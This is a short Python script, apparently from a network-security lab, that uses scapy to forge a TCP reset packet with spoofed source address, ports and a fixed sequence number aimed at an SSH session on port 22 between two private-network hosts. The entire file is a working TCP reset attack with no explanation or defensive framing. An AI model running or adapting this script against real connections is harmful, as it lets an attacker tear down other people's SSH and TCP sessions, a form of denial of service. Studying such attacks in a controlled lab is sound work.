#!/usr/bin/python3

import sys
from scapy.all import *

print("SENDING RESET PACKET......")

IPLayer = IP(src="192.168.5.1", dst="192.168.5.2")
TCPLayer = TCP(sport=49204, dport=22, flags="R", seq=142424913)
pkt = IPLayer/TCPLayer

send(pkt, verbose=0)
